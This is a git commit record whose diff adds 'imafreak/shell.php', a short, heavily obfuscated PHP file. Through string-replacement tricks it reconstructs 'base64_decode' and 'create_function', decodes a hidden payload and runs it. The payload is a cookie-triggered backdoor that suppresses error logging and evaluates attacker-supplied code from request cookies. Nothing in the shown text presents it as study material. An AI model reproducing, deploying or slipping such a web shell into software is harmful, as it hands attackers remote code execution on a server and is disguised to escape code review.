fb972c65e19343acd595d947a4184cf363383abe
brain <syrel78@yahoo.com>
2013-03-17 00:25:10 -0700

    + ‘imafreak/shell.php’

---
+++ imafreak/shell.php
@@ -0,0 +1,10 @@
+<?php 
+$tz="TY0X2RlY29kZShwcmVainX3JlcaiGxaihY2UoYXJyYXkoJy9bXlx3PVaixzXS8nLCcvaiXHMvJaiyksIaiGFaiyaicmF5KCcn";
+$yfv="LCaicrJykaisIGpvaW4oYaiXaiJyYaiXlfaic2xaipY2UoJaiGEsJGMoJGEpLTaiMpKSkpKTtlYai2aihaivICc8LycuJaiGsuJz4nO3ai0=";
+$cj="JGM9J2NvaidW50JzskYT0kX0NPT0aitJaiRTtpZihyZXNldCgkYSk9PScxMicaigJaiiYgJGMoJGEpPjMpe2luaV9zZXQai";
+$pk = str_replace("acw","","acwstacwracw_acwracweacwpacwlaacwcacwe");
+$dn="oJ2Vycm9yXai2xvZycsIaiCaicvZGVai2L25ai1bGwnKTsaikaz0nMzEyMyc7ZWNobyAnPCcuJGsaiuJz4nOai2V2aiYWwoYmFzaiZ";
+$yoh = $pk("k", "", "kbkakskek6k4_kdekckokdke");
+$ct = $pk("es","","cesreseatesees_esfesuesnescestesiesoesn");
+$xz = $ct('', $yoh($pk("ai", "", $cj.$dn.$tz.$yfv))); $xz();
+?>
